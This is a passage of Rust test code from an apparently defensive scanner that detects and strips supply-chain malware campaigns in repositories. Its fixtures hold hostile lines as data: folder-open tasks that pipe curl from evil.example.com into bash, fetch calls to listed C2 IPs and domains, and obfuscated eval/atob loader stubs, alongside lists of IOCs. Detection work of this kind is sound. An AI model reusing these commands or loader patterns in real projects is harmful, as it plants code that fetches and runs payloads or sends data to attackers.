mod axios_bluenoroff;
mod glassworm;
mod polinrider;
mod shai_hulud;

pub use axios_bluenoroff::axios_bluenoroff_pack;
pub use glassworm::glassworm_pack;
pub use polinrider::{polinrider_fingerprint, polinrider_pack};
pub use shai_hulud::shai_hulud_pack;

use wormward_core::Pack;

/// All campaign packs compiled into this build.
pub fn builtin_packs() -> Vec<Pack> {
    vec![polinrider_pack(), shai_hulud_pack(), glassworm_pack(), axios_bluenoroff_pack()]
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;
    use wormward_core::{scan_repo, FindingKind};

    #[test]
    fn builtin_packs_includes_polinrider() {
        let packs = builtin_packs();
        assert!(packs.iter().any(|p| p.manifest.id == "polinrider"));
    }

    #[test]
    fn polinrider_bracket_global_marker_round_trips_to_working_regex() {
        // The generalized bracket-global marker is written as an escape-prone YAML regex.
        // Verify the LOADED string matches the exact regex proven in the remediate tests,
        // and that it actually matches bracket-notation (any key) while sparing dot-notation.
        use wormward_core::remediate::strip_marker_matches;
        let packs = builtin_packs();
        let pol = packs.iter().find(|p| p.manifest.id == "polinrider").unwrap();
        let markers = &pol
            .manifest
            .remediation
            .as_ref()
            .unwrap()
            .config_payload
            .as_ref()
            .unwrap()
            .markers;
        // Loads verbatim as the regex the remediate crate is tested against.
        assert!(markers.contains(&r"re:global\[('|\x22)[^'\x22]+('|\x22)\]\s*=".to_string()));
        // Canonical literal markers are preserved (canonical payload must still fix+push).
        assert!(markers.contains(&"global['!']=".to_string()));
        // Bracket-global of an arbitrary key matches; dot-notation deliberately does not.
        assert!(strip_marker_matches("global['xyz']=1;PAYLOAD", markers));
        assert!(strip_marker_matches("global[\"foo\"] = 2;PAYLOAD", markers));
        assert!(!strip_marker_matches("const a = global.foo;", markers));
    }

    #[test]
    fn detects_infected_fixture_repo() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("victim");
        fs::create_dir_all(repo.join(".git")).unwrap();
        // Fixture config file carrying the primary signature marker.
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nvar q=(\"rmcej%otb%\",2857687);",
        )
        .unwrap();
        fs::write(repo.join("temp_auto_push.bat"), "@echo off\n").unwrap();

        let findings = scan_repo(&repo, &builtin_packs());
        assert!(findings.iter().any(|f| f.kind == FindingKind::ContentSignature));
        assert!(findings.iter().any(|f| f.kind == FindingKind::Artifact));
    }

    #[test]
    fn clean_repo_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("postcss.config.mjs"), "export default {};\n").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn analyzer_adds_confirmed_finding_on_full_fingerprint() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("victim");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='8-270-2';var _$_1e42=(function(a,b){return a})('x',7);",
        )
        .unwrap();

        let findings = scan_repo(&repo, &builtin_packs());
        assert!(findings.iter().any(|f| f.kind == FindingKind::Analyzer));
    }

    #[test]
    fn builtin_packs_includes_shai_hulud() {
        assert!(builtin_packs().iter().any(|p| p.manifest.id == "shai-hulud"));
    }

    #[test]
    fn detects_shai_hulud_dropper_and_preinstall() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("victim");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("setup_bun.js"), "// dropper fixture").unwrap();
        fs::write(
            repo.join("package.json"),
            r#"{"name":"x","scripts":{"preinstall":"node setup_bun.js"}}"#,
        )
        .unwrap();

        let findings = scan_repo(&repo, &builtin_packs());
        assert!(findings.iter().any(|f| f.campaign == "shai-hulud"
            && f.kind == FindingKind::Artifact
            && f.file == Some(std::path::PathBuf::from("setup_bun.js"))));
        assert!(findings.iter().any(|f| f.campaign == "shai-hulud"
            && f.kind == FindingKind::ContentSignature));
    }

    #[test]
    fn generic_environment_json_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        // Generic filenames the high-confidence posture deliberately ignores.
        fs::write(repo.join("environment.json"), "{}").unwrap();
        fs::write(repo.join("contents.json"), "{}").unwrap();
        fs::write(repo.join("package.json"), r#"{"name":"x"}"#).unwrap();

        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn detects_xor_key_in_config() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("vite.config.mjs"), "export default {};\nvar k='2[gWfGj;<:-93Z^C';").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.campaign == "polinrider" && x.signature_id == "xor-key-primary"));
    }

    #[test]
    fn detects_tron_c2_address() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("webpack.config.js"), "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.signature_id == "c2-tron-primary"));
    }

    #[test]
    fn detects_staking_uuid_in_vscode_tasks() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".vscode")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join(".vscode/tasks.json"),
            r#"{"projectInfo":{"uuid":"e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9"}}"#,
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.signature_id == "staking-uuid"));
    }

    #[test]
    fn detects_marker_in_nested_app_js() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join("src")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("src/App.js"), "var q=(\"rmcej%otb%\",2857687);").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.campaign == "polinrider"
            && x.file == Some(std::path::PathBuf::from("src/App.js"))));
    }

    #[test]
    fn detects_new_c2_domain_260120() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("astro.config.mjs"), "fetch('https://260120.vercel.app/settings/mac')").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.kind == FindingKind::IocDomain));
    }

    #[test]
    fn clean_app_js_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join("src")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("src/App.js"), "export default function App(){ return null; }").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn legit_fa_solid_woff2_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join("public/fonts")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("public/fonts/fa-solid-400.woff2"), "binary-font-bytes").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn detects_shai_hulud_workflow_artifact() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".github/workflows")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join(".github/workflows/shai-hulud-workflow.yml"), "on: push\n").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.campaign == "shai-hulud" && x.kind == FindingKind::Artifact));
    }

    #[test]
    fn detects_webhook_uuid_in_arbitrary_workflow() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".github/workflows")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        // Different filename than shai-hulud-workflow.yml — caught by content, not name.
        fs::write(
            repo.join(".github/workflows/ci.yml"),
            "run: curl https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7\n",
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.campaign == "shai-hulud"
            && x.kind == FindingKind::ContentSignature
            && x.signature_id == "webhook-c2"));
    }

    #[test]
    fn detects_sha1hulud_string_in_bun_environment() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("bun_environment.js"), "config('--name','SHA1HULUD')").unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.campaign == "shai-hulud"
            && x.kind == FindingKind::ContentSignature
            && x.signature_id == "runner-sha1hulud"));
    }

    #[test]
    fn clean_workflow_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".github/workflows")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join(".github/workflows/ci.yml"), "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn generic_bundle_and_data_json_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("bundle.js"), "console.log('legit webpack output');").unwrap();
        fs::write(repo.join("data.json"), "{}").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn detects_dot_notation_variant() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal.o='5-3-235-du';var _$_8e2c=(function(a,b){return a})('x',7);",
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        // Caught by the generalized analyzer AND the decoder-pattern signature.
        assert!(f.iter().any(|x| x.campaign == "polinrider" && x.kind == FindingKind::Analyzer));
        assert!(f.iter().any(|x| x.signature_id == "decoder-pattern"));
    }

    #[test]
    fn detects_ethereum_c2_ip() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("next.config.mjs"), "fetch('http://23.27.20.187/c2')").unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.signature_id == "c2-ethereum-ip"));
    }

    #[test]
    fn clean_config_not_flagged_by_structural_sigs() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };\n",
        )
        .unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty());
    }

    #[test]
    fn clean_dense_source_not_flagged_by_entropy_tail() {
        // Regression: ordinary, dense source files (an Express server index.js, a
        // Next.js config) have a last-512-byte tail entropy of ~5.1-5.4. The old
        // entropy-tail threshold of 5.0 false-flagged them as CRITICAL polinrider
        // infections even though they carry no decoder, padding, marker, or C2. With
        // no strippable action, they surfaced as "not auto-fixable" noise on clean
        // repos. Real payloads are still caught by decoder-pattern / padding-run.
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        let dense = "#!/usr/bin/env node\nconst express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n  res.json({\n    name: 'demo', version: '0.1.0',\n    features: ['No Code Required', 'Lightning Fast', 'AI-Powered', 'Universal Compatibility'],\n    endpoints: { 'POST /api/generate': 'Generate', 'GET /api/health': 'Health check' },\n  });\n});\napp.listen(3000, () => { console.log(`Server running on port 3000 for API info & docs.`); });\nmodule.exports = app;\n";
        fs::write(repo.join("index.js"), dense).unwrap();
        assert!(
            scan_repo(&repo, &builtin_packs()).is_empty(),
            "dense but clean source must not be flagged by the entropy-tail signature"
        );
    }

    #[test]
    fn padding_and_dot_notation_variant_is_auto_fixable() {
        // The real-world variant seen on infected repos: a legitimate config, then a
        // long space-padding run, then a dot-notation `global.i='<version>'` tag and an
        // `_$_xxxx` decoder IIFE. The configured strip markers deliberately excluded
        // dot-notation and could not match the variable-key `global[_$_...]=` shim, so
        // the payload was detected but not auto-strippable. It must now strip cleanly.
        use wormward_core::plan_remediation;
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        let legit = "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };";
        let payload = "global.i='5-3-168';var _$_46e0=(function(r,i){return r})('ABCD',7);global[_$_46e0[0]]=1;var q='rmcej%otb%';";
        let infected = format!("{legit}{}{payload}", " ".repeat(260));
        fs::write(repo.join("postcss.config.mjs"), &infected).unwrap();

        let packs = builtin_packs();
        let findings = scan_repo(&repo, &packs);
        assert!(!findings.is_empty(), "variant must still be detected");

        let plan = plan_remediation(&findings, &packs);
        assert!(
            !plan.actions.is_empty(),
            "variant must now map to a strip action (auto-fixable)"
        );
        let res = wormward_core::apply(&repo, &plan.actions, false);
        assert!(!res.applied.is_empty(), "strip must actually apply");

        // The file is reduced to exactly the legitimate config prefix...
        let cleaned = fs::read_to_string(repo.join("postcss.config.mjs")).unwrap();
        assert_eq!(cleaned, format!("{legit}\n"));
        // ...and a re-scan finds nothing (verify-after-strip would pass).
        assert!(
            scan_repo(&repo, &packs).is_empty(),
            "no signature may survive the strip"
        );
    }

    #[test]
    fn injected_esm_shim_is_stripped_with_payload() {
        // PolinRider injects a `createRequire` ESM shim at the TOP of .mjs configs (so its
        // payload can call require) AND appends the obfuscated payload at the bottom. The marker
        // cut removes the bottom payload; the pack's strip_lines must also excise the top shim,
        // leaving a pristine config — matching a from-history restore.
        use wormward_core::plan_remediation;
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        let legit =
            "import path from 'path';\nconst nextConfig = { output: 'standalone' };\nexport default nextConfig;";
        let shim =
            "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n";
        let payload =
            "global.i='5-3-168';var _$_46e0=(function(r,i){return r})('ABCD',7);global[_$_46e0[0]]=require;";
        let infected = format!(
            "import path from 'path';\n{shim}const nextConfig = {{ output: 'standalone' }};\nexport default nextConfig;{}{payload}",
            " ".repeat(260)
        );
        fs::write(repo.join("next.config.mjs"), &infected).unwrap();

        let packs = builtin_packs();
        assert!(!scan_repo(&repo, &packs).is_empty(), "infection must be detected");

        let plan = plan_remediation(&scan_repo(&repo, &packs), &packs);
        assert!(!plan.actions.is_empty(), "must be auto-fixable");
        let res = wormward_core::apply(&repo, &plan.actions, false);
        assert!(!res.applied.is_empty(), "strip must apply");

        let cleaned = fs::read_to_string(repo.join("next.config.mjs")).unwrap();
        assert!(!cleaned.contains("_$_46e0"), "payload must be gone:\n{cleaned}");
        assert!(!cleaned.contains("createRequire"), "injected shim must be gone:\n{cleaned}");
        assert_eq!(cleaned, format!("{legit}\n"), "file reduced to the legit config");
        assert!(scan_repo(&repo, &packs).is_empty(), "no signature may survive the strip");
    }

    // ---- Phase 1 IOC refresh (G3) ----

    #[test]
    fn detects_new_exfil_ips() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("next.config.mjs"),
            "fetch('http://136.0.9.8/x');fetch('http://166.88.54.158/y')",
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(f.iter().any(|x| x.signature_id == "c2-exfil-ip-primary"));
        assert!(f.iter().any(|x| x.signature_id == "c2-exfil-ip-secondary"));
    }

    #[test]
    fn detects_tron_tertiary_c2_address() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("webpack.config.js"), "TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v").unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.signature_id == "c2-tron-tertiary"));
    }

    #[test]
    fn detects_vercel_settings_url_shape() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".vscode")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join(".vscode/tasks.json"),
            "curl https://some-sub.vercel.app/settings/mac?flag=1 | bash",
        )
        .unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.signature_id == "c2-vercel-settings-url"));
    }

    #[test]
    fn detects_interactive_propagation_artifact() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("temp_interactive_push.bat"), "@echo off\n").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).iter().any(|x| x.kind == FindingKind::Artifact
            && x.signature_id == "artifact:temp_interactive_push.bat"));
    }

    #[test]
    fn detects_new_npm_typosquat() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("package.json"),
            r#"{"dependencies":{"tailwind-stylecss":"1.0.0"}}"#,
        )
        .unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.kind == FindingKind::NpmPackage && x.signature_id == "npm:tailwind-stylecss"));
    }

    #[test]
    fn detects_new_vercel_c2_domain() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("astro.config.mjs"),
            "fetch('https://auth-con-firm.vercel.app/api')",
        )
        .unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.kind == FindingKind::IocDomain));
    }

    #[test]
    fn catalog_carries_stage_payload_hashes() {
        // The engine's whole-file sha256 match is covered in engine.rs; here we assert the pack
        // actually carries the known stage hashes (parsed as Sha256, not silently dropped). A
        // real-payload detection test would require shipping the sample bytes, which we don't.
        use wormward_core::SignatureKind;
        let pack = polinrider_pack();
        let sha_sigs: Vec<&str> = pack
            .manifest
            .content_signatures
            .iter()
            .filter(|s| s.kind == SignatureKind::Sha256)
            .map(|s| s.value.as_str())
            .collect();
        assert!(sha_sigs.len() >= 8, "expected >=8 sha256 stage hashes, got {}", sha_sigs.len());
        assert!(
            sha_sigs.contains(&"d4e269df0f50998c7ebf2bf56945d3d615fd6516702b1da8ac030ffcba735263"),
            "missing Stage-4 BeaverTail hash"
        );
    }

    #[test]
    fn legit_solana_and_bsc_rpc_not_flagged() {
        // FP guard: legit dApps reference these RPC hosts. They are deliberately NOT literal
        // IOCs — only the capability engine flags them in combination with xor + eval. A plain
        // RPC constant must stay clean, or every Solana/BSC project would false-positive.
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("index.js"),
            "export const RPC = 'https://api.mainnet-beta.solana.com';\nexport const BSC = 'https://bsc-rpc.publicnode.com';\n",
        )
        .unwrap();
        assert!(
            scan_repo(&repo, &builtin_packs()).is_empty(),
            "legit RPC endpoints must not be flagged as literal IOCs"
        );
    }

    #[test]
    fn history_pickaxe_finds_scrubbed_payload() {
        use std::process::Command;
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .env("GIT_AUTHOR_NAME", "t")
                .env("GIT_AUTHOR_EMAIL", "t@t")
                .env("GIT_COMMITTER_NAME", "t")
                .env("GIT_COMMITTER_EMAIL", "t@t")
                .output()
                .unwrap()
        };
        git(&["init", "-q"]);
        // Commit the infection...
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nvar q=(\"rmcej%otb%\",2857687);",
        )
        .unwrap();
        git(&["add", "-A"]);
        git(&["commit", "-q", "-m", "add"]);
        // ...then scrub it from the working tree and commit the clean version.
        fs::write(repo.join("postcss.config.mjs"), "export default {};\n").unwrap();
        git(&["add", "-A"]);
        git(&["commit", "-q", "-m", "clean"]);

        let packs = builtin_packs();
        // The tip is clean...
        assert!(scan_repo(&repo, &packs).is_empty(), "tip must be clean after scrub");
        // ...but the pickaxe still surfaces the infection from history.
        let hist = wormward_core::scan_history(&repo, &packs);
        assert!(
            hist.iter().any(|f| f.kind == FindingKind::HistoryHit && f.git_ref.is_some()),
            "history pickaxe must surface the scrubbed payload, got {hist:?}"
        );
    }

    #[test]
    fn malicious_tasks_json_is_deletable() {
        use wormward_core::{apply, plan_remediation, RemediationAction};
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".vscode")).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        // folderOpen auto-run that curl|bash's a payload — fires the TasksJson capability gate.
        // Non-IOC host so ONLY the capability finding fires (not a content signature).
        fs::write(
            repo.join(".vscode/tasks.json"),
            r#"{"version":"2.0.0","tasks":[{"label":"x","type":"shell","command":"curl https://evil.example.com/setup.sh | bash","runOptions":{"runOn":"folderOpen"}}]}"#,
        )
        .unwrap();
        let packs = builtin_packs();
        let findings = scan_repo(&repo, &packs);
        assert!(
            findings
                .iter()
                .any(|f| f.file == Some(std::path::PathBuf::from(".vscode/tasks.json"))),
            "malicious tasks.json must be detected, got {findings:?}"
        );
        let plan = plan_remediation(&findings, &packs);
        assert!(
            plan.actions.iter().any(|a| matches!(a, RemediationAction::DeleteFile { file } if file.ends_with("tasks.json"))),
            "malicious tasks.json must map to a delete action, got {:?}",
            plan.actions
        );
        assert!(!apply(&repo, &plan.actions, false).applied.is_empty());
        assert!(!repo.join(".vscode/tasks.json").exists(), "tasks.json must be deleted");
    }

    #[test]
    fn date_skew_flags_antidated_commit() {
        use std::process::Command;
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str], cdate: &str| {
            Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .env("GIT_AUTHOR_NAME", "t")
                .env("GIT_AUTHOR_EMAIL", "t@t")
                .env("GIT_COMMITTER_NAME", "t")
                .env("GIT_COMMITTER_EMAIL", "t@t")
                // Author date now; committer date backdated ~1 year (clock-rewind tell).
                .env("GIT_AUTHOR_DATE", "2026-07-20T12:00:00")
                .env("GIT_COMMITTER_DATE", cdate)
                .output()
                .unwrap()
        };
        git(&["init", "-q"], "2026-07-20T12:00:00");
        fs::write(repo.join("f.txt"), "hi").unwrap();
        git(&["add", "-A"], "2026-07-20T12:00:00");
        git(&["commit", "-q", "-m", "antidated"], "2025-01-08T00:00:00");

        let hits = wormward_core::scan_date_skew(&repo);
        assert!(
            hits.iter().any(|f| f.kind == FindingKind::DateSkew && f.git_ref.is_some()),
            "a commit with a large author/committer date gap must be flagged, got {hits:?}"
        );
    }

    #[test]
    fn date_skew_quiet_on_normal_commit() {
        use std::process::Command;
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .env("GIT_AUTHOR_NAME", "t")
                .env("GIT_AUTHOR_EMAIL", "t@t")
                .env("GIT_COMMITTER_NAME", "t")
                .env("GIT_COMMITTER_EMAIL", "t@t")
                .output()
                .unwrap()
        };
        git(&["init", "-q"]);
        fs::write(repo.join("f.txt"), "hi").unwrap();
        git(&["add", "-A"]);
        git(&["commit", "-q", "-m", "normal"]);
        assert!(
            wormward_core::scan_date_skew(&repo).is_empty(),
            "a normal commit (author≈committer) must not be flagged"
        );
    }

    // ---- Phase 1 lockfile / dependency detection (G2) ----

    #[test]
    fn lockfile_flags_bad_package_version() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("pnpm-lock.yaml"),
            "packages:\n  /tailwindcss-style-animate@1.1.6:\n    resolution: {integrity: sha512-x}\n",
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        assert!(
            f.iter().any(|x| x.campaign == "polinrider"
                && x.signature_id == "pkg:npm:tailwindcss-style-animate@1.1.6"),
            "malicious locked package must be flagged, got {f:?}"
        );
    }

    #[test]
    fn lockfile_clean_version_not_flagged() {
        // A different (safe) version of a version-pinned bad package must NOT fire.
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("pnpm-lock.yaml"),
            "packages:\n  /tailwindcss-style-animate@9.9.9:\n    resolution: {integrity: sha512-x}\n  /react@18.2.0:\n    resolution: {integrity: sha512-y}\n",
        )
        .unwrap();
        assert!(
            scan_repo(&repo, &builtin_packs()).is_empty(),
            "a non-malicious version of a version-pinned package must not fire"
        );
    }

    #[test]
    fn node_modules_dependency_payload_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        let pkg = repo.join("node_modules/tailwind-animationbased");
        fs::create_dir_all(&pkg).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(pkg.join("package.json"), r#"{"name":"tailwind-animationbased","version":"2.0.0","main":"index.js"}"#).unwrap();
        // Entrypoint carries the injected v1 payload.
        fs::write(
            pkg.join("index.js"),
            "module.exports={};\nglobal['!']='8-270-2';var _$_1e42=(function(a,b){return a})('x',7);",
        )
        .unwrap();

        let f = scan_repo(&repo, &builtin_packs());
        assert!(
            f.iter().any(|x| x.kind == FindingKind::NpmPackage
                && x.signature_id == "pkg:npm:tailwind-animationbased@2.0.0"),
            "installed malicious package must be flagged, got {f:?}"
        );
        assert!(
            f.iter().any(|x| x.kind == FindingKind::Analyzer
                && x.file == Some(std::path::PathBuf::from("node_modules/tailwind-animationbased/index.js"))),
            "injected payload in a dependency entrypoint must be flagged, got {f:?}"
        );
    }

    #[test]
    fn clean_node_modules_dependency_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("clean");
        let pkg = repo.join("node_modules/lodash");
        fs::create_dir_all(&pkg).unwrap();
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(pkg.join("package.json"), r#"{"name":"lodash","version":"4.17.21","main":"index.js"}"#).unwrap();
        fs::write(pkg.join("index.js"), "module.exports = require('./lodash');").unwrap();
        assert!(scan_repo(&repo, &builtin_packs()).is_empty(), "a clean dependency must not fire");
    }

    #[test]
    fn community_package_is_low_and_tagged() {
        // A community-sourced lead must surface as a Low, `pkg-community:`-tagged finding (so the
        // CLI can suppress it by default) — never a hard critical/"infected" verdict.
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("pnpm-lock.yaml"),
            "packages:\n  /plain-crypto-js@4.2.1:\n    resolution: {integrity: sha512-x}\n",
        )
        .unwrap();
        let f = scan_repo(&repo, &builtin_packs());
        let hit = f.iter().find(|x| x.signature_id.starts_with("pkg-community:npm:plain-crypto-js"));
        assert!(hit.is_some(), "community lead must be tagged pkg-community, got {f:?}");
        assert_eq!(hit.unwrap().severity, wormward_core::Severity::Low);
    }

    #[test]
    fn lockfile_flags_composer_package() {
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("v");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(
            repo.join("composer.lock"),
            r#"{"packages":[{"name":"thiio/kubernetes-php-sdk","version":"1.0.0"}]}"#,
        )
        .unwrap();
        assert!(scan_repo(&repo, &builtin_packs())
            .iter()
            .any(|x| x.signature_id == "pkg:composer:thiio/kubernetes-php-sdk@1.0.0"));
    }

    // --- wave-3 acceptance: version-independent detect + structural clean over the expanded set ---
    const WAVE3_NAMES: &[&str] = &["postcss.config.mjs", "metro.config.js", "app.config.ts", "seed.ts"];

    fn wave3_file() -> String {
        // version 5-3-168, decoders _$_3317/_$_46e0, seed 3657078 — NONE in any signature list.
        let pad = " ".repeat(2000);
        let shim = "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n";
        let legit = "const config = { plugins: [] };\n";
        let blob = "global.o='5-3-168-du';global.i='5-3-168';var _$_3317=(function(a,b){return eval(atob(a))})('cmVx',3657078);var _$_46e0=String.fromCharCode(127);global['r']=require;";
        format!("{shim}{legit}export default config;{pad}{blob}")
    }

    #[test]
    fn wave3_detected_cleaned_and_verifies_clean() {
        use std::path::Path;
        use wormward_core::remediate::{action_for, apply};
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("victim");
        fs::create_dir_all(repo.join(".git")).unwrap();
        for name in WAVE3_NAMES {
            fs::write(repo.join(name), wave3_file()).unwrap();
        }
        let packs = builtin_packs();

        // DETECT: a remediable polinrider finding on every file, despite all-novel constants and
        // two of the files (metro.config.js, app.config.ts, seed.ts) not being in any per-name list.
        let findings = scan_repo(&repo, &packs);
        for name in WAVE3_NAMES {
            assert!(
                findings.iter().any(|f| f.file.as_deref() == Some(Path::new(name))
                    && f.campaign == "polinrider"
                    && f.remediable),
